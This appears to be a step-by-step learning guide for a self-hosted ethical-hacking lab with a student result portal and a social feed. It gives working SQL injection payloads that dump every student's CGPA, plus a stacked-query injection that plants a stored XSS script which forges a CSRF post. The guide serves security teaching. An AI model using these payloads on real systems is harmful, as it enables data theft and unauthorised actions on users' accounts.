# Ethical Hacking Practice Problem — Step-by-Step Learning Guide

A guided walkthrough for the two tasks in this repo. The goal is to teach you
**how to think** your way through each exploit, one small step at a time, then
show the final verified payload. Every claim below has been tested against the
running lab.

> **Ethics reminder (from the README):** use this only against the instance you
> run yourself. Do not point these techniques at anything you don't own or
> don't have explicit permission to test.

---

## 0. Get the lab running

```bash
node scripts/generate-seed-sql.js   # (optional) rerolls CGPAs
docker compose up --build
```

- Result site:  http://localhost:3000
- Social site:  http://localhost:3001

The database is `tmpfs` — every `docker compose down && up` gives you a clean
slate. If you break the data while experimenting (you will!), that's the reset
button:

```bash
docker compose down && docker compose up --build
```

---

## 1. Know your target before you attack

Read the source first. There are only a few files:

| File                      | What it is                          |
| ------------------------- | ----------------------------------- |
| `result-site/server.js` | Student result portal (port 3000)   |
| `social-site/server.js` | Social feed (port 3001)             |
| `result-site/db.js`     | DB pool for the result DB           |
| `social-site/db.js`     | DB pool for the social DB           |
| `mysql-init/*.sql`      | Schema + seeded data (100 students) |

### The result-site login query (this is the whole vuln)

```js
// result-site/server.js
const sql = `SELECT * FROM result WHERE student_id = '${student_id}' AND password = '${password}'`;
```

The inputs are concatenated straight into the SQL string. **No escaping, no
parameterized query.** That's SQL injection.

Also note `result-site/db.js`:

```js
const pool = mysql.createPool({
  ...
  multipleStatements: true   // <-- lets us run several SQL statements in one query
});
```

We'll come back to that in Task 2.

### The social-site post endpoint (vuln #2)

```js
// social-site/server.js
app.post("/create", async (req, res) => {
  const username = getSessionUser(req);       // checks the session cookie
  ...
  await pool.execute("INSERT INTO post (username, post) VALUES (?, ?)", [username, message]);
  res.redirect("/");
});
```

- Login uses a **parameterized query** — not SQL-injectable. Good.
- The post endpoint trusts the session cookie and has **no CSRF token**, **no
  SameSite=cookie lockdown**, **no origin check**. That's the CSRF hole.

### Where the two apps connect

The social site *displays* whatever is stored in the `result` table? No — check
again:

- Result page shows `first_name`, `last_name`, `cgpa` **without HTML escaping**
  (line 12–13, 27). Raw HTML from the DB goes straight into the page.
- Social site *escapes* post text with `escapeHtml` (line 16–22, 102) — so you
  can't XSS through a normal social post.

The connection: **the result DB is the storage, and its unescaped rendering is
the XSS sink.** If we can write HTML into the `result` table, the result page
will execute it. And the result DB is writable — because of `multipleStatements`.

Now the two tasks should feel related:

- **Task 1:** read all CGPAs out of the result DB (SQLi on the read).
- **Task 2:** write a script into the result DB (SQLi on the write) that, when
  Liam checks his result, silently makes his browser post to the social site.

---

# Task 1 — Get everyone's CGPA (SQL Injection)

**Goal:** as `3005001 / Smith123`, extract all 100 CGPAs in one shot.

## Step 1. Confirm a normal login works

```
http://localhost:3000/?student_id=3005001&password=Smith123
```

You get a page with `Liam Smith | 2.99`. So the query returns Liam's row and the
page prints `first_name last_name` and `cgpa`.

## Step 2. Look at how the page renders results

```js
function renderPage(row) {
  const nameCell = row ? `${row.first_name} ${row.last_name}` : "";
  const cgpaCell = row ? row.cgpa : "";
  ...
  <tr><td>${nameCell}</td><td>${cgpaCell}</td></tr>
```

**Critical observation:** the page prints only **one row** — `rows[0]`
(line 46: `row = rows.length > 0 ? rows[0] : null`). So even if our injected
query returns 100 rows, the page will only show the first one.

This shapes the whole attack: we don't just want "all rows returned"; we want
**all the data packed into the single row the page displays.** That's what
`GROUP_CONCAT` is for.

## Step 3. Confirm the injection point

The query is:

```sql
SELECT * FROM result WHERE student_id = '3005001' AND password = 'Smith123'
```

Our inputs sit between single quotes. A classic first probe: put a lone quote in
the password.

```
password = '
```

The query becomes:

```sql
SELECT * FROM result WHERE student_id = '3005001' AND password = ''
```

That's a **syntax error** — the app catches it and prints the empty table
("Name | CGPA" with an empty row). Wait, no — actually the trailing `'` after
our input is balanced by the closing `'` in the source, so it's
`password = ''''`... let's just say a quote usually produces an error page or an
empty result. Either way, testing with `'` is the classic "does it break?" probe.

**Better probe:** try a condition that's always true:

```
password = ' OR '1'='1
```

The query becomes:

```sql
SELECT * FROM result WHERE student_id = '3005001' AND password = '' OR '1'='1'
```

This returns **every row in the table** (because `'1'='1'` is true for every
row). The page still only shows the first row (which for the seeded data is
student 3005001). Hmm, so "all rows" isn't directly visible.

So now you know: the injection point works, but returning all rows isn't enough
because of `rows[0]`.

## Step 4. Learn to build a UNION

`UNION` lets you run a second `SELECT` and glue its rows under the first query's
rows. Requirements:

1. Same **number of columns** as the first query.
2. Compatible column types.

`SELECT * FROM result` — how many columns? The schema (`mysql-init/01-result-schema.sql`)
says: `student_id, first_name, last_name, password, cgpa` → **5 columns**.

So:

```sql
SELECT * FROM result WHERE student_id = 'x' AND password = '' 
UNION SELECT 1, 'A', 'B', 'C', 4.44
--          ^ 1  ^ 2  ^ 3  ^ 4  ^ 5
```

With a trick to make the *first* query return nothing (`student_id = 'x'` has no
match), the only rows shown come from our `UNION SELECT`. Now we control the one
row the page displays.

## Step 5. Make the first query return nothing

We must keep the outer shape valid. In the password field:

```
password = ' AND '1'='0' UNION SELECT ...
```

Full query:

```sql
SELECT * FROM result
WHERE student_id = '3005001'
  AND password = '' AND '1'='0'          -- false → 0 rows
UNION
SELECT 1, 'A', 'B', 'C', 4.44 FROM result
```

The first `SELECT` returns nothing; the `UNION` part returns our row(s). The
page then prints exactly what we put in columns 2 (name) and 5 (cgpa).

## Step 6. Pack all 100 CGPAs into the displayed row

Instead of `SELECT 4.44`, select all the data and squash it into one string with
`GROUP_CONCAT`:

```sql
SELECT 1, GROUP_CONCAT(first_name), GROUP_CONCAT(last_name), 'x', GROUP_CONCAT(cgpa) FROM result
```

`GROUP_CONCAT(x)` joins every row's `x` with commas into a single value — and a
single value means a single row, which the page *will* show.

### The final Task 1 payload

Put it in the **password** field (raw, before URL-encoding):

```sql
' AND '1'='0' UNION SELECT 1, GROUP_CONCAT(first_name), GROUP_CONCAT(last_name), 'x', GROUP_CONCAT(cgpa) FROM result WHERE '1'='1' --
```

Notes on the pieces:

| Piece                        | Why                                                                               |
| ---------------------------- | --------------------------------------------------------------------------------- |
| `' AND '1'='0'`            | closes our input's quote, keeps SQL valid, makes first query return 0 rows        |
| `UNION SELECT`             | adds our own query's results                                                      |
| `1`                        | dummy for`student_id` (INT)                                                     |
| `GROUP_CONCAT(first_name)` | all first names in one cell (col 2 = name)                                        |
| `GROUP_CONCAT(last_name)`  | all last names (keeps name column readable)                                       |
| `'x'`                      | dummy for`password` (col 4)                                                     |
| `GROUP_CONCAT(cgpa)`       | **all 100 CGPAs in the displayed cell (col 5)**                             |
| `WHERE '1'='1'`            | keeps the union query's own condition always true                                 |
| `-- `                      | comments out the trailing`'` from `password = '...'` so the query stays valid |

> Note the **trailing space after `--`**: MySQL requires `--` followed by a
> space (or tab) to be treated as a comment. No space = syntax error.

### URL-encoded request (copy-paste ready)

```
http://localhost:3000/?student_id=3005001&password=%27%20AND%20%271%27%3D%270%27%20UNION%20SELECT%201%2C%20GROUP_CONCAT%28first_name%29%2C%20GROUP_CONCAT%28last_name%29%2C%20%27x%27%2C%20GROUP_CONCAT%28cgpa%29%20FROM%20result%20WHERE%20%271%27%3D%271%27%20--%20
```

Send it (browser address bar, curl, Burp, or Postman all work). The CGPA cell of
the result page now contains all 100 CGPAs comma-separated. You have Task 1 done.

### Learning checklist for Task 1

- [ ] Why does returning "all rows" not help here? (→ `rows[0]`)
- [ ] What does `UNION` require? (→ same column count, compatible types)
- [ ] Why `GROUP_CONCAT`? (→ pack N rows into 1 so the page shows it)
- [ ] Why `-- ` with a trailing space?
- [ ] What would break if the query had `LIMIT 1` at the end? (→ the `--` comment strategy)

---

# Task 2 — Stored XSS → CSRF

**Goal:** as `3005001 / Smith123` on both sites, make checking your result
automatically publish `I got <CGPA>` on your own social feed. No other
interaction.

## Step 1. Find the XSS sink

The result page interpolates DB values into HTML with no escaping:

```js
const nameCell = row ? `${row.first_name} ${row.last_name}` : "";
...
<tr><td>${nameCell}</td><td>${cgpaCell}</td></tr>
```

If `last_name` in the DB contained `<script>alert(1)</script>`, the result page
would execute it. So: **stored XSS exists as soon as we can put HTML into the
result table.** We just need a way to *write* to that table.

## Step 2. Find the write primitive: stacked queries

The result DB pool has `multipleStatements: true`. That means the SQLi we already
have can run **more than one statement in a single request**:

```sql
SELECT * FROM result WHERE student_id = '3005001' AND password = 'x';
UPDATE result SET last_name = '<script>...</script>' WHERE student_id = 3005001;
-- '
```

The `;` separates statements; the second one writes our payload into the DB. This
is the "SQLi on the write" mentioned earlier.

**Pitfall we hit in testing:** `first_name` is `VARCHAR(50)` — the 400+ char
script silently got truncated (`Data too long` under strict mode, and the app
swallowed the error). **`last_name` is `VARCHAR(500)`** — big enough. Put the
payload in `last_name`, keep `first_name = 'Liam'` so the row still looks normal.

## Step 3. Design the stored XSS payload

The script runs *inside* the result page after Liam checks his result. At that
moment:

1. The result page is showing Liam's own CGPA in the table.
2. Liam's browser has a valid session cookie for the **social** site (he logged
   into it earlier — that's the setup, not the attack).

So the payload should:

1. **Read the CGPA off the page** (so we don't need to hardcode it).
2. **Silently submit a form POST** to the social site's `/create` — the CSRF.

### Why a hidden form, not fetch/XMLHttpRequest?

`fetch('http://localhost:3001/create', {credentials:'include'})` would be a
**cross-origin** request from port 3000 to port 3001. The browser applies CORS:
without `Access-Control-Allow-Origin` on the social site, the response is blocked
(and a preflight would block the request itself).

A **form POST** is a *simple request* — browsers send it cross-origin without
preflight, cookies included, no CORS needed. This is the classic CSRF vector:
old-school `<form>`s don't respect Same-Origin Policy.

### Why the cookie is sent at all

Liam's `sid` cookie was set by the social site. Does the browser send it to
`localhost:3001` when a page on `localhost:3000` submits a form there?

- Cookies are scoped to **host**, not port. `localhost:3000` and `localhost:3001`
  share the host `localhost`.
- The social site sets the cookie without `SameSite=None` and the app has no
  CSRF token / origin check — so the cookie rides along on the form POST, and the
  server happily creates the post for the logged-in user.

> This is exactly why "we don't use the same password on two sites" and "CSRF
> tokens are a thing" are real-world lessons. The same host + no SameSite guard =
> CSRF across the two services.

### The payload script (stored in `last_name`)

```html
<script>window.addEventListener("DOMContentLoaded",function(){
  var tds = document.getElementsByTagName("td");
  if (tds.length >= 2) {
    var cgpa = tds[1].textContent.trim();
    var f = document.createElement("form");
    f.method = "POST";
    f.action = "http://localhost:3001/create";
    var i = document.createElement("input");
    i.type = "hidden";
    i.name = "message";
    i.value = "I got " + cgpa;
    f.appendChild(i);
    document.body.appendChild(f);
    f.submit();
  }
});</script>
```

Piece by piece:

| Piece                                      | Why                                                             |
| ------------------------------------------ | --------------------------------------------------------------- |
| `DOMContentLoaded`                       | ensures the table (with the CGPA cell) exists before we read it |
| `document.getElementsByTagName("td")[1]` | `td` #0 is the name cell, `td` #1 is the CGPA cell          |
| `.textContent.trim()`                    | grab`2.99` (no HTML, no whitespace)                           |
| `f.method = "POST"`                      | must match`app.post("/create", ...)`                          |
| `f.action = ".../create"`                | the vulnerable endpoint                                         |
| `i.name = "message"`                     | must match`const { message } = req.body`                      |
| `f.submit()`                             | fire the CSRF silently                                          |

## Step 4. Deliver it with the stacked-query SQLi

Raw password payload (before URL-encoding):

```sql
x'; UPDATE result SET first_name = 'Liam', last_name = '<script>...</script>' WHERE student_id = 3005001; --
```

`first_name = 'Liam'` is included to restore the name and make the row look
normal (and to undo any earlier messing around).

### URL-encoded request (copy-paste ready)

```
http://localhost:3000/?student_id=3005001&password=x%27%3B%20UPDATE%20result%20SET%20first_name%20%3D%20%27Liam%27%2C%20last_name%20%3D%20%27%3Cscript%3Ewindow.addEventListener%28%22DOMContentLoaded%22%2Cfunction%28%29%7Bvar%20tds%3Ddocument.getElementsByTagName%28%22td%22%29%3Bif%28tds.length%3E%3D2%29%7Bvar%20cgpa%3Dtds%5B1%5D.textContent.trim%28%29%3Bvar%20f%3Ddocument.createElement%28%22form%22%29%3Bf.method%3D%22POST%22%3Bf.action%3D%22http%3A%2F%2Flocalhost%3A3001%2Fcreate%22%3Bvar%20i%3Ddocument.createElement%28%22input%22%29%3Bi.type%3D%22hidden%22%3Bi.name%3D%22message%22%3Bi.value%3D%22I%20got%20%22%2Bcgpa%3Bf.appendChild%28i%29%3Bdocument.body.appendChild%28f%29%3Bf.submit%28%29%3B%7D%7D%29%3B%3C%2Fscript%3E%27%20WHERE%20student_id%20%3D%203005001%3B%20--%20
```

After sending this once, `last_name` for student 3005001 now contains the script.

> **No URL-encoder needed:** you do *not* have to paste the ugly encoded string.
> Because the Result site's form is a `GET` request, whatever you type into the
> **Password** input box is passed straight into the SQL query — your browser
> URL-encodes it automatically when you hit "View Result". The manual walkthrough
> below uses that instead.

### Manual walkthrough (no URL encoding)

**Step A — Log into the Social Site (port 3001)**

1. Open your browser and go to `http://localhost:3001/login`.
2. Log in as `liam_smith` / `Smith123`.
3. Leave this tab open. (This gives your browser the session cookie the CSRF needs.)

**Step B — Plant the payload via the input field (port 3000)**

1. Open a new tab and go to `http://localhost:3000`.
2. In the **Student ID** field, type: `3005001`
3. In the **Password** field, paste this exact raw payload:
   ```sql
   x'; UPDATE result SET first_name = 'Liam', last_name = '<script>window.addEventListener("DOMContentLoaded",function(){var tds=document.getElementsByTagName("td");if(tds.length>=2){var cgpa=tds[1].textContent.trim();var f=document.createElement("form");f.method="POST";f.action="http://localhost:3001/create";var i=document.createElement("input");i.type="hidden";i.name="message";i.value="I got "+cgpa;f.appendChild(i);document.body.appendChild(f);f.submit();}});</script>' WHERE student_id = 3005001; --
   ```
4. Click **"View Result"**.

*(Note: the page will likely load and show an empty table or an error. This is
normal — it means the `UPDATE` ran successfully in the background and saved your
script into the database.)*

**Step C — Trigger the trap**

1. In that same browser tab, go back to `http://localhost:3000`.
2. This time, log in normally:
   - **Student ID:** `3005001`
   - **Password:** `Smith123`
3. Click **"View Result"**.

**Step D — Watch the magic**

1. The page loads and displays your name and CGPA.
2. The hidden script instantly executes, reads your CGPA, and submits the hidden
   form to port 3001.
3. Your browser automatically redirects you to your social media feed at
   `http://localhost:3001/`.
4. You should now see the post: **"I got X.XX"** at the top of your feed.

### Why this works (recap)

The backend builds the query by string concatenation:

```js
const sql = `SELECT * FROM result WHERE student_id = '${student_id}' AND password = '${password}'`;
```

Typing `x'; UPDATE...` into the password field produces the stacked query:

```sql
SELECT * FROM result WHERE student_id = '3005001' AND password = 'x'; UPDATE result SET...
```

Same principle as Task 1 — the input is trusted raw text — but using `UPDATE`
instead of `UNION SELECT`. Using the input box is the intended way to interact
with the lab.

## Step 5. Trigger it (the "one interaction")

*(If you already did Steps A–D above, skip straight to the "Learning checklist".)*

Now Liam just does the one normal action the task describes: **check his result.**

1. In your browser, log into the social site as `liam_smith / Smith123` first
   (this sets the `sid` cookie that the CSRF needs — it's the setup, not the
   attack).
2. Visit the result site as `3005001 / Smith123`:
   ```
   http://localhost:3000/?student_id=3005001&password=Smith123
   ```

The stored `<script>` runs, reads `2.99` off the page, and silently POSTs
`message=I got 2.99` to `http://localhost:3001/create`. The browser follows the
redirect to `/`, landing on the social feed showing:

```
Liam Smith
I got 2.99
```

That's Task 2 complete. No extra clicks.

## Step 6. Verify it the way the README suggests

The README hints to use a second account in a second browser/session to confirm a
payload "fires for a logged-in viewer in general." You can, for instance:

1. Log in as `3005001` on the social site in **normal** (non-incognito) window.
2. Log in as any other user (say `olivia_johnson`) in an **incognito** window
   just to prove that a *different* logged-in viewer also sees posts on the feed
   — but the graded chain is the 3005001 flow above.

### Learning checklist for Task 2

- [ ] Where exactly is the unescaped output? (→ result-site/server.js:12–13, 27)
- [ ] Why does social-site escaping make posting-XSS impossible there?
- [ ] What role does `multipleStatements: true` play? (→ write primitive)
- [ ] Why store in `last_name`, not `first_name`? (→ VARCHAR widths)
- [ ] Why a `<form>` submit instead of `fetch`? (→ CORS / simple request)
- [ ] Why does the social cookie get sent to `/create`? (→ host-scoped cookies, no SameSite/CSRF guard)

---

## Troubleshooting

| Symptom                                  | Likely cause                                                                                                                 |
| ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| Empty result table after Task 1 payload  | `--` missing trailing space; or wrong column count in UNION                                                                |
| Task 1 returns only one CGPA             | Query is returning multiple rows but page shows`rows[0]` → you need `GROUP_CONCAT`                                      |
| Task 2 script truncated / name looks cut | Stored into`first_name` (VARCHAR(50)) → use `last_name` (VARCHAR(500))                                                  |
| No post appears                          | Not logged into social site in the same browser; or visited a different host (`127.0.0.1` vs `localhost` cookie scoping) |
| DB got polluted while experimenting      | `docker compose down && docker compose up --build`                                                                         |

## Reset

```bash
docker compose down
node scripts/generate-seed-sql.js   # optional: reroll CGPAs
docker compose up --build
```
